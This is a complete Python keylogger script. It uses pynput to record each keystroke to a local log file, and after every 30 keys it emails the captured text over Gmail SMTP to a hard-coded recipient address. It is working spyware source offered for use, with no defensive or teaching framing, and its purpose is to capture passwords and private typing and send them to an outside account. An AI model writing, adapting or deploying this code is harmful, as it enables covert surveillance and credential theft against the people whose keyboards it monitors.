import os
import smtplib
import logging
from pynput import keyboard
from datetime import datetime
from threading import Timer
import socket

# ------------------ CONFIGURATION ------------------

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")

EMAIL_REPORT = True
SEND_AFTER_KEYS = 30  # Send email after this many keys

EMAIL_CONFIG = {
    "sender": "your_email_here",
    "password": "app_password_from_your_gmail_here",  
    "recipient": "raifnzaman1@gmail.com", # Change to your email
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587
}

# ------------------ SETUP LOGGING ------------------

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s',
)

# ------------------ KEYLOGGER LOGIC ------------------

key_count = 0
key_buffer = []

def send_email(log_data):
    try:
        with smtplib.SMTP(EMAIL_CONFIG["smtp_server"], EMAIL_CONFIG["smtp_port"]) as server:
            server.starttls()
            server.login(EMAIL_CONFIG["sender"], EMAIL_CONFIG["password"])
            message = f"Subject: Keylogger Report\n\n{log_data}"
            server.sendmail(EMAIL_CONFIG["sender"], EMAIL_CONFIG["recipient"], message)
    except Exception as e:
        logging.error(f"Email sending failed: {e}")

def log_key(key):
    global key_count, key_buffer

    try:
        # Try to get printable character
        key_text = key.char
    except AttributeError:
        # Handle special keys
        key_text = f"[{key.name.upper()}]"

    logging.info(key_text)
    key_buffer.append(key_text)
    key_count += 1

    # Optional email reporting
    if EMAIL_REPORT and key_count >= SEND_AFTER_KEYS:
        send_email("\n".join(key_buffer))
        key_buffer.clear()
        key_count = 0

def on_press(key):
    log_key(key)

    # Exit when ESC is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

# ------------------ MAIN ------------------

def main():
    print(f"[INFO] Keylogger running on {socket.gethostname()}... Logs will be saved to: {LOG_FILE}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
